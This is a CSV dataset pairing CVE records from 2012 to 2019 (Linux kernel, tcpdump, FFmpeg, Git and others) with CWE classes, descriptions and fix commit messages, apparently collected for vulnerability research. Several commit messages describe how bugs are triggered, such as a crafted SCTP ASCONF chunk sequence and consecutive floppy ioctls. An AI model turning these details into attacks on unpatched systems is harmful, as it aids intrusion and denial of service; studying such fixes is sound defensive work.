cveID,cweID,publishedDate,cveDescription,commitMsg
CVE-2018-17456,CWE-88,2018-10-06,"Git before 2.14.5, 2.15.x before 2.15.3, 2.16.x before 2.16.5, 2.17.x before 2.17.2, 2.18.x before 2.18.1, and 2.19.x before 2.19.1 allows remote code execution during processing of a recursive ""git clone"" of a superproject if a .gitmodules file has a URL field beginning with a '-' character.","Urls with leading dashes can cause mischief on older versions of Git. We should detect them so that they can be rejected by receive.fsckObjects, preventing modern versions of git from being a vector by which attacks can spread.  Signed-off-by: Jeff King <peff@peff.net> Signed-off-by: Junio C Hamano <gitster@pobox.com>"
CVE-2018-20845,CWE-369,2019-06-26,"Division-by-zero vulnerabilities in the functions pi_next_pcrl, pi_next_cprl, and pi_next_rpcl in openmj2/pi.c in OpenJPEG through 2.3.0 allow remote attackers to cause a denial of service (application crash).",
CVE-2018-7998,CWE-362,2018-03-09,"In libvips before 8.6.3, a NULL function pointer dereference vulnerability was found in the vips_region_generate function in region.c, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted image file. This occurs because of a race condition involving a failed delayed load and other worker threads.","If a delayed load failed, it could leave the pipeline only half-set up. Sebsequent threads could then segv.  Set a load-has-failed flag and test before generate.  See https://github.com/jcupitt/libvips/issues/893"
CVE-2017-13007,CWE-125,2017-09-14,The Apple PKTAP parser in tcpdump before 4.9.2 has a buffer over-read in print-pktap.c:pktap_if_print().,"The sub-dissector expects that the length and captured length will reflect the actual remaining data in the packet, not the raw amount including the PKTAP header; pass an updated header, just as we do for PPI.  This fixes a buffer over-read discovered by Yannick Formaggio.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-7097,CWE-285,2016-10-16,"The filesystem implementation in the Linux kernel through 4.8.2 preserves the setgid bit during a setxattr call, which allows local users to gain group privileges by leveraging the existence of a setgid program with restrictions on execute permissions.","When file permissions are modified via chmod(2) and the user is not in the owning group or capable of CAP_FSETID, the setgid bit is cleared in inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file permissions as well as the new ACL, but doesn't clear the setgid bit in a similar way; this allows to bypass the check in chmod(2).  Fix that.  References: CVE-2016-7097 Reviewed-by: Christoph Hellwig <hch@lst.de> Reviewed-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Jan Kara <jack@suse.cz> Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>"
CVE-2014-3673,CWE-20,2014-11-10,"The SCTP implementation in the Linux kernel through 3.17.2 allows remote attackers to cause a denial of service (system crash) via a malformed ASCONF chunk, related to net/sctp/sm_make_chunk.c and net/sctp/sm_statefuns.c.","Commit 6f4c618 (""SCTP : Add paramters validity check for ASCONF chunk"") added basic verification of ASCONF chunks, however, it is still possible to remotely crash a server by sending a special crafted ASCONF chunk, even up to pre 2.6.12 kernels:  skb_over_panic: text:ffffffffa01ea1c3 len:31056 put:30768  head:ffff88011bd81800 data:ffff88011bd81800 tail:0x7950  end:0x440 dev:<NULL>  ------------[ cut here ]------------ kernel BUG at net/core/skbuff.c:129! [...] Call Trace:  <IRQ>  [<ffffffff8144fb1c>] skb_put+0x5c/0x70  [<ffffffffa01ea1c3>] sctp_addto_chunk+0x63/0xd0 [sctp]  [<ffffffffa01eadaf>] sctp_process_asconf+0x1af/0x540 [sctp]  [<ffffffff8152d025>] ? _read_unlock_bh+0x15/0x20  [<ffffffffa01e0038>] sctp_sf_do_asconf+0x168/0x240 [sctp]  [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]  [<ffffffff8147645d>] ? fib_rules_lookup+0xad/0xf0  [<ffffffffa01e6b22>] ? sctp_cmp_addr_exact+0x32/0x40 [sctp]  [<ffffffffa01e8393>] sctp_assoc_bh_rcv+0xd3/0x180 [sctp]  [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]  [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]  [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]  [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff81496ded>] ip_local_deliver_finish+0xdd/0x2d0  [<ffffffff81497078>] ip_local_deliver+0x98/0xa0  [<ffffffff8149653d>] ip_rcv_finish+0x12d/0x440  [<ffffffff81496ac5>] ip_rcv+0x275/0x350  [<ffffffff8145c88b>] __netif_receive_skb+0x4ab/0x750  [<ffffffff81460588>] netif_receive_skb+0x58/0x60  This can be triggered e.g., through a simple scripted nmap connection scan injecting the chunk after the handshake, for example, ...    -------------- INIT[ASCONF; ASCONF_ACK] ------------->   <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------   ------------------ ASCONF; UNKNOWN ------------------>  ... where ASCONF chunk of length 280 contains 2 parameters ...    1) Add IP address parameter (param length: 16)   2) Add/del IP address parameter (param length: 255)  ... followed by an UNKNOWN chunk of e.g. 4 bytes. Here, the Address Parameter in the ASCONF chunk is even missing, too. This is just an example and similarly-crafted ASCONF chunks could be used just as well.  The ASCONF chunk passes through sctp_verify_asconf() as all parameters passed sanity checks, and after walking, we ended up successfully at the chunk end boundary, and thus may invoke sctp_process_asconf(). Parameter walking is done with WORD_ROUND() to take padding into account.  In sctp_process_asconf()'s TLV processing, we may fail in sctp_process_asconf_param() e.g., due to removal of the IP address that is also the source address of the packet containing the ASCONF chunk, and thus we need to add all TLVs after the failure to our ASCONF response to remote via helper function sctp_add_asconf_response(), which basically invokes a sctp_addto_chunk() adding the error parameters to the given skb.  When walking to the next parameter this time, we proceed with ...    length = ntohs(asconf_param->param_hdr.length);   asconf_param = (void *)asconf_param + length;  ... instead of the WORD_ROUND()'ed length, thus resulting here in an off-by-one that leads to reading the follow-up garbage parameter length of 12336, and thus throwing an skb_over_panic for the reply when trying to sctp_addto_chunk() next time, which implicitly calls the skb_put() with that length.  Fix it by using sctp_walk_params() [ which is also used in INIT parameter processing ] macro in the verification *and* in ASCONF processing: it will make sure we don't spill over, that we walk parameters WORD_ROUND()'ed. Moreover, we're being more defensive and guard against unknown parameter types and missized addresses.  Joint work with Vlad Yasevich.  Fixes: b896b82 (""[SCTP] ADDIP: Support for processing incoming ASCONF_ACK chunks."") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-8071,CWE-404,2017-04-23,"drivers/hid/hid-cp2112.c in the Linux kernel 4.9.x before 4.9.9 uses a spinlock without considering that sleeping is possible in a USB HID request callback, which allows local users to cause a denial of service (deadlock) via unspecified vectors.","A recent commit fixing DMA-buffers on stack added a shared transfer buffer protected by a spinlock. This is broken as the USB HID request callbacks can sleep. Fix this up by replacing the spinlock with a mutex.  Fixes: 1ffb3c4 (""HID: cp2112: make transfer buffers DMA capable"") Cc: stable <stable@vger.kernel.org>	# 4.9 Signed-off-by: Johan Hovold <johan@kernel.org> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2016-3062,CWE-119,2016-06-16,The mov_read_dref function in libavformat/mov.c in Libav before 11.7 and FFmpeg before 0.11 allows remote attackers to cause a denial of service (memory corruption) or execute arbitrary code via the entries value in a dref box in an MP4 file.,This fixes a potential crash.  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2014-4014,CWE-264,2014-06-23,"The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are inapplicable to inodes, which allows local users to bypass intended chmod restrictions by first creating a user namespace, as demonstrated by setting the setgid bit on a file with group ownership of root.","The kernel has no concept of capabilities with respect to inodes; inodes exist independently of namespaces.  For example, inode_capable(inode, CAP_LINUX_IMMUTABLE) would be nonsense.  This patch changes inode_capable to check for uid and gid mappings and renames it to capable_wrt_inode_uidgid, which should make it more obvious what it does.  Fixes CVE-2014-4014.  Cc: Theodore Ts'o <tytso@mit.edu> Cc: Serge Hallyn <serge.hallyn@ubuntu.com> Cc: ""Eric W. Biederman"" <ebiederm@xmission.com> Cc: Dave Chinner <david@fromorbit.com> Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-5547,CWE-119,2017-02-06,"drivers/hid/hid-corsair.c in the Linux kernel 4.9.x before 4.9.6 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","Not all platforms support DMA to the stack, and specifically since v4.9 this is no longer supported on x86 with VMAP_STACK either.  Note that the macro-mode buffer was larger than necessary.  Fixes: 6f78193 (""HID: corsair: Add Corsair Vengeance K90 driver"") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2015-5156,CWE-119,2015-10-19,"The virtnet_probe function in drivers/net/virtio_net.c in the Linux kernel before 4.2 attempts to support a FRAGLIST feature without proper memory allocation, which allows guest OS users to cause a denial of service (buffer overflow and memory corruption) via a crafted sequence of fragmented packets.","virtio declares support for NETIF_F_FRAGLIST, but assumes that there are at most MAX_SKB_FRAGS + 2 fragments which isn't always true with a fraglist.  A longer fraglist in the skb will make the call to skb_to_sgvec overflow the sg array, leading to memory corruption.  Drop NETIF_F_FRAGLIST so we only get what we can handle.  Cc: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Jason Wang <jasowang@redhat.com> Acked-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-3695,CWE-74,2017-12-29,The einj_error_inject function in drivers/acpi/apei/einj.c in the Linux kernel allows local users to simulate hardware errors and consequently cause a denial of service by leveraging failure to disable APEI error injection through EINJ when securelevel is set.,"ACPI provides an error injection mechanism, EINJ, for debugging and testing the ACPI Platform Error Interface (APEI) and other RAS features. If supported by the firmware, ACPI specification 5.0 and later provide for a way to specify a physical memory address to which to inject the error.  Injecting errors through EINJ can produce errors which to the platform are indistinguishable from real hardware errors. This can have undesirable side-effects, such as causing the platform to mark hardware as needing replacement.  While it does not provide a method to load unauthenticated privileged code, the effect of these errors may persist across reboots and affect trust in the underlying hardware, so disable error injection through EINJ if securelevel is set.  Signed-off-by: Linn Crosetto <linn@hpe.com>"
CVE-2014-0038,CWE-20,2014-02-06,"The compat_sys_recvmmsg function in net/compat.c in the Linux kernel before 3.13.2, when CONFIG_X86_X32 is enabled, allows local users to gain privileges via a recvmmsg system call with a crafted timeout pointer parameter.","The x32 case for the recvmsg() timout handling is broken:    asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,                                       unsigned int vlen, unsigned int flags,                                       struct compat_timespec __user *timeout)   {           int datagrams;           struct timespec ktspec;            if (flags & MSG_CMSG_COMPAT)                   return -EINVAL;            if (COMPAT_USE_64BIT_TIME)                   return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,                                         flags | MSG_CMSG_COMPAT,                                         (struct timespec *) timeout);           ...  The timeout pointer parameter is provided by userland (hence the __user annotation) but for x32 syscalls it's simply cast to a kernel pointer and is passed to __sys_recvmmsg which will eventually directly dereference it for both reading and writing.  Other callers to __sys_recvmmsg properly copy from userland to the kernel first.  The bug was introduced by commit ee4fa23 (""compat: Use COMPAT_USE_64BIT_TIME in net/compat.c"") and should affect all kernels since 3.4 (and perhaps vendor kernels if they backported x32 support along with this code).  Note that CONFIG_X86_X32_ABI gets enabled at build time and only if CONFIG_X86_X32 is enabled and ld can build x32 executables.  Other uses of COMPAT_USE_64BIT_TIME seem fine.  This addresses CVE-2014-0038.  Signed-off-by: PaX Team <pageexec@freemail.hu> Signed-off-by: H. Peter Anvin <hpa@linux.intel.com> Cc: <stable@vger.kernel.org> # v3.4+ Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-3158,CWE-119,2014-11-15,"Integer overflow in the getword function in options.c in pppd in Paul's PPP Package (ppp) before 2.4.7 allows attackers to ""access privileged options"" via a long word in an options file, which triggers a heap-based buffer overflow that ""[corrupts] security-relevant variables.""","When we are reading in a word from an options file, we maintain a count of the length we have seen so far in 'len', which is an int.  When len exceeds MAXWORDLEN - 1 (i.e. 1023) we cease storing characters in the buffer but we continue to increment len.  Since len is an int, it will wrap around to -2147483648 after it reaches 2147483647.  At that point our test of (len < MAXWORDLEN-1) will succeed and we will start writing characters to memory again.  This may enable an attacker to overwrite the heap and thereby corrupt security-relevant variables.  For this reason it has been assigned a CVE identifier, CVE-2014-3158.  This fixes the bug by ceasing to increment len once it reaches MAXWORDLEN.  Reported-by: Lee Campbell <leecam@google.com> Signed-off-by: Paul Mackerras <paulus@samba.org>"
CVE-2012-2893,CWE-399,2012-09-26,"Double free vulnerability in libxslt, as used in Google Chrome before 22.0.1229.79, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to XSL transforms.",
CVE-2017-12994,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().,"The loop can be executed more than once (that's kinda the whole point of a loop), so the check has to be made each time through the loop, not just once before the loop is executed.  Do some additional length checks while we're at it.  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-10807,CWE-287,2017-07-04,"JabberD 2.x (aka jabberd2) before 2.6.1 allows anyone to authenticate using SASL ANONYMOUS, even when the sasl.anonymous c2s.xml option is not enabled.",
CVE-2017-13046,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2019-14284,CWE-369,2019-07-26,"In the Linux kernel before 5.2.3, drivers/block/floppy.c allows a denial of service by setup_format_params division-by-zero. Two consecutive ioctls can trigger the bug: the first one should set the drive geometry with .sect and .rate values that make F_SECT_PER_TRACK be zero. Next, the floppy format operation should be called. It can be triggered by an unprivileged local user even when a floppy disk has not been inserted. NOTE: QEMU creates the floppy device by default.","This fixes a divide by zero error in the setup_format_params function of the floppy driver.  Two consecutive ioctls can trigger the bug: The first one should set the drive geometry with such .sect and .rate values for the F_SECT_PER_TRACK to become zero.  Next, the floppy format operation should be called.  A floppy disk is not required to be inserted.  An unprivileged user could trigger the bug if the device is accessible.  The patch checks F_SECT_PER_TRACK for a non-zero value in the set_geometry function.  The proper check should involve a reasonable upper limit for the .sect and .rate fields, but it could change the UAPI.  The patch also checks F_SECT_PER_TRACK in the setup_format_params, and cancels the formatting operation in case of zero.  The bug was found by syzkaller.  Signed-off-by: Denis Efremov <efremov@ispras.ru> Tested-by: Willy Tarreau <w@1wt.eu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-17858,CWE-119,2018-01-22,"Heap-based buffer overflow in the ensure_solid_xref function in pdf/pdf-xref.c in Artifex MuPDF 1.12.0 allows a remote attacker to potentially execute arbitrary code via a crafted PDF file, because xref subsection object numbers are unrestricted.",
CVE-2016-6197,CWE-20,2016-08-06,"fs/overlayfs/dir.c in the OverlayFS filesystem implementation in the Linux kernel before 4.6 does not properly verify the upper dentry before proceeding with unlink and rename system-call processing, which allows local users to cause a denial of service (system crash) via a rename system call that specifies a self-hardlink.","Unlink and rename in overlayfs checked the upper dentry for staleness by verifying upper->d_parent against upperdir.  However the dentry can go stale also by being unhashed, for example.  Expand the verification to actually look up the name again (under parent lock) and check if it matches the upper dentry.  This matches what the VFS does before passing the dentry to filesytem's unlink/rename methods, which excludes any inconsistency caused by overlayfs.  Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>"
CVE-2017-17853,CWE-119,2017-12-27,kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect BPF_RSH signed bounds calculations.,"Incorrect signed bounds were being computed. If the old upper signed bound was positive and the old lower signed bound was negative, this could cause the new upper signed bound to be too low, leading to security issues.  Fixes: b03c9f9 (""bpf/verifier: track signed and unsigned min/max values"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Edward Cree <ecree@solarflare.com> Acked-by: Alexei Starovoitov <ast@kernel.org> [jannh@google.com: changed description to reflect bug impact] Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2017-16805,CWE-125,2017-11-13,"In radare2 2.0.1, libr/bin/dwarf.c allows remote attackers to cause a denial of service (invalid read and application crash) via a crafted ELF file, related to r_bin_dwarf_parse_comp_unit in dwarf.c and sdb_set_internal in shlr/sdb/src/sdb.c.",
CVE-2017-18249,CWE-362,2018-03-26,"The add_free_nid function in fs/f2fs/node.c in the Linux kernel before 4.12 does not properly track an allocated nid, which allows local users to cause a denial of service (race condition) or possibly have unspecified other impact via concurrent threads.","In below concurrent case, allocated nid can be loaded into free nid cache and be allocated again.  Thread A				Thread B - f2fs_create  - f2fs_new_inode   - alloc_nid    - __insert_nid_to_list(ALLOC_NID_LIST) 					- f2fs_balance_fs_bg 					 - build_free_nids 					  - __build_free_nids 					   - scan_nat_page 					    - add_free_nid 					     - __lookup_nat_cache  - f2fs_add_link   - init_inode_metadata    - new_inode_page     - new_node_page      - set_node_addr  - alloc_nid_done   - __remove_nid_from_list(ALLOC_NID_LIST) 					     - __insert_nid_to_list(FREE_NID_LIST)  This patch makes nat cache lookup and free nid list operation being atomical to avoid this race condition.  Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org> Signed-off-by: Chao Yu <yuchao0@huawei.com> Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>"
CVE-2017-10663,CWE-129,2017-08-19,"The sanity_check_ckpt function in fs/f2fs/super.c in the Linux kernel before 4.12.4 does not validate the blkoff and segno arrays, which allows local users to gain privileges via unspecified vectors.",Make sure segno and blkoff read from raw image are valid.  Cc: stable@vger.kernel.org Signed-off-by: Jin Qian <jinqian@google.com> [Jaegeuk Kim: adjust minor coding style] Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>
CVE-2013-2017,CWE-399,2013-05-03,"The veth (aka virtual Ethernet) driver in the Linux kernel before 2.6.34 does not properly manage skbs during congestion, which allows remote attackers to cause a denial of service (system crash) by leveraging lack of skb consumption in conjunction with a double-free error.","In case of congestion, netif_rx() frees the skb, so we must assume dev_forward_skb() also consume skb.  Bug introduced by commit 4454096 (veth: move loopback logic to common location)  We must change dev_forward_skb() to always consume skb, and veth to not double free it.  Bug report : http://marc.info/?l=linux-netdev&m=127310770900442&w=3  Reported-by: Martín Ferrari <martin.ferrari@gmail.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-6430,CWE-125,2017-03-15,The compile_tree function in ef_compiler.c in the Etterfilter utility in Ettercap 0.8.2 and earlier allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted filter.,
CVE-2016-10145,CWE-189,2017-03-24,Off-by-one error in coders/wpg.c in ImageMagick allows remote attackers to have unspecified impact via vectors related to a string copy.,
CVE-2012-6537,CWE-200,2013-03-15,"net/xfrm/xfrm_user.c in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability.",The memory reserved to dump the xfrm policy includes multiple padding bytes added by the compiler for alignment (padding bytes in struct xfrm_selector and struct xfrm_userpolicy_info). Add an explicit memset(0) before filling the buffer to avoid the heap info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2018-8787,CWE-190,2018-11-29,FreeRDP prior to version 2.0.0-rc4 contains an Integer Overflow that leads to a Heap-Based Buffer Overflow in function gdi_Bitmap_Decompress() and results in a memory corruption and probably even a remote code execution.,Thanks to Eyal Itkin from Check Point Software Technologies.
CVE-2018-7492,CWE-476,2018-02-26,"A NULL pointer dereference was found in the net/rds/rdma.c __rds_rdma_map() function in the Linux kernel before 4.14.7 allowing local attackers to cause a system panic and a denial-of-service, related to RDS_GET_MR and RDS_GET_MR_FOR_DEST.","This is a fix for syzkaller719569, where memory registration was attempted without any underlying transport being loaded.  Analysis of the case reveals that it is the setsockopt() RDS_GET_MR (2) and RDS_GET_MR_FOR_DEST (7) that are vulnerable.  Here is an example stack trace when the bug is hit:  BUG: unable to handle kernel NULL pointer dereference at 00000000000000c0 IP: __rds_rdma_map+0x36/0x440 [rds] PGD 2f93d03067 P4D 2f93d03067 PUD 2f93d02067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: bridge stp llc tun rpcsec_gss_krb5 nfsv4 dns_resolver nfs fscache rds binfmt_misc sb_edac intel_powerclamp coretemp kvm_intel kvm irqbypass crct10dif_pclmul c rc32_pclmul ghash_clmulni_intel pcbc aesni_intel crypto_simd glue_helper cryptd iTCO_wdt mei_me sg iTCO_vendor_support ipmi_si mei ipmi_devintf nfsd shpchp pcspkr i2c_i801 ioatd ma ipmi_msghandler wmi lpc_ich mfd_core auth_rpcgss nfs_acl lockd grace sunrpc ip_tables ext4 mbcache jbd2 mgag200 i2c_algo_bit drm_kms_helper ixgbe syscopyarea ahci sysfillrect sysimgblt libahci mdio fb_sys_fops ttm ptp libata sd_mod mlx4_core drm crc32c_intel pps_core megaraid_sas i2c_core dca dm_mirror dm_region_hash dm_log dm_mod CPU: 48 PID: 45787 Comm: repro_set2 Not tainted 4.14.2-3.el7uek.x86_64 #2 Hardware name: Oracle Corporation ORACLE SERVER X5-2L/ASM,MOBO TRAY,2U, BIOS 31110000 03/03/2017 task: ffff882f9190db00 task.stack: ffffc9002b994000 RIP: 0010:__rds_rdma_map+0x36/0x440 [rds] RSP: 0018:ffffc9002b997df0 EFLAGS: 00010202 RAX: 0000000000000000 RBX: ffff882fa2182580 RCX: 0000000000000000 RDX: 0000000000000000 RSI: ffffc9002b997e40 RDI: ffff882fa2182580 RBP: ffffc9002b997e30 R08: 0000000000000000 R09: 0000000000000002 R10: ffff885fb29e3838 R11: 0000000000000000 R12: ffff882fa2182580 R13: ffff882fa2182580 R14: 0000000000000002 R15: 0000000020000ffc FS:  00007fbffa20b700(0000) GS:ffff882fbfb80000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00000000000000c0 CR3: 0000002f98a66006 CR4: 00000000001606e0 Call Trace:  rds_get_mr+0x56/0x80 [rds]  rds_setsockopt+0x172/0x340 [rds]  ? __fget_light+0x25/0x60  ? __fdget+0x13/0x20  SyS_setsockopt+0x80/0xe0  do_syscall_64+0x67/0x1b0  entry_SYSCALL64_slow_path+0x25/0x25 RIP: 0033:0x7fbff9b117f9 RSP: 002b:00007fbffa20aed8 EFLAGS: 00000293 ORIG_RAX: 0000000000000036 RAX: ffffffffffffffda RBX: 00000000000c84a4 RCX: 00007fbff9b117f9 RDX: 0000000000000002 RSI: 0000400000000114 RDI: 000000000000109b RBP: 00007fbffa20af10 R08: 0000000000000020 R09: 00007fbff9dd7860 R10: 0000000020000ffc R11: 0000000000000293 R12: 0000000000000000 R13: 00007fbffa20b9c0 R14: 00007fbffa20b700 R15: 0000000000000021  Code: 41 56 41 55 49 89 fd 41 54 53 48 83 ec 18 8b 87 f0 02 00 00 48 89 55 d0 48 89 4d c8 85 c0 0f 84 2d 03 00 00 48 8b 87 00 03 00 00 <48> 83 b8 c0 00 00 00 00 0f 84 25 03 00 0 0 48 8b 06 48 8b 56 08  The fix is to check the existence of an underlying transport in __rds_rdma_map().  Signed-off-by: Håkon Bugge <haakon.bugge@oracle.com> Reported-by: syzbot <syzkaller@googlegroups.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7141,CWE-287,2016-10-03,"curl and libcurl before 7.50.2, when built with NSS and the libnsspem.so library is available at runtime, allow remote attackers to hijack the authentication of a TLS connection by leveraging reuse of a previously loaded client certificate from file for a connection for which no certificate has been set, a different vulnerability than CVE-2016-5420.",... when we are not asked to use a certificate from file
CVE-2016-7035,CWE-285,2018-09-10,"An authorization flaw was found in Pacemaker before 1.1.16, where it did not properly guard its IPC interface. An attacker with an unprivileged account on a Pacemaker node could use this flaw to, for example, force the Local Resource Manager daemon to execute a script as root and thereby gain root access on the machine.","It was discovered that at some not so uncommon circumstances, some pacemaker daemons could be talked to, via libqb-facilitated IPC, by unprivileged clients due to flawed authorization decision.  Depending on the capabilities of affected daemons, this might equip unauthorized user with local privilege escalation or up to cluster-wide remote execution of possibly arbitrary commands when such user happens to reside at standard or remote/guest cluster node, respectively.  The original vulnerability was introduced in an attempt to allow unprivileged IPC clients to clean up the file system materialized leftovers in case the server (otherwise responsible for the lifecycle of these files) crashes.  While the intended part of such behavior is now effectively voided (along with the unintended one), a best-effort fix to address this corner case systemically at libqb is coming along (ClusterLabs/libqb#231).  Affected versions:  1.1.10-rc1 (2013-04-17) - 1.1.15 (2016-06-21) Impact:             Important CVSSv3 ranking:     8.8 : AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H  Credits for independent findings, in chronological order:   Jan ""poki"" Pokorný, of Red Hat   Alain Moulle, of ATOS/BULL"
CVE-2018-14395,CWE-369,2018-07-19,libavformat/movenc.c in FFmpeg 3.2 and 4.0.2 allows attackers to cause a denial of service (application crash caused by a divide-by-zero error) with a user crafted audio file when converting to the MOV audio format.,The version 1 needs the channel count and would divide by 0 Fixes: division by 0 Fixes: fpe_movenc.c_1108_1.ogg Fixes: fpe_movenc.c_1108_2.ogg Fixes: fpe_movenc.c_1108_3.wav  Found-by: #CHEN HONGXU# <HCHEN017@e.ntu.edu.sg> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2013-7281,CWE-200,2014-01-08,"The dgram_recvmsg function in net/ieee802154/dgram.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel stack memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","Only update *addr_len when we actually fill in sockaddr, otherwise we can return uninitialized memory from the stack to the caller in the recvfrom, recvmmsg and recvmsg syscalls. Drop the the (addr_len == NULL) checks because we only get called with a valid addr_len pointer either from sock_common_recvmsg or inet_recvmsg.  If a blocking read waits on a socket which is concurrently shut down we now return zero and set msg_msgnamelen to 0.  Reported-by: mpb <mpb.mail@gmail.com> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-11449,,2017-07-19,"coders/mpc.c in ImageMagick before 7.0.6-1 does not enable seekable streams and thus cannot validate blob sizes, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via an image received from stdin.",
CVE-2017-14041,CWE-787,2017-08-30,"A stack-based buffer overflow was discovered in the pgxtoimage function in bin/jp2/convert.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service or possibly remote code execution.",
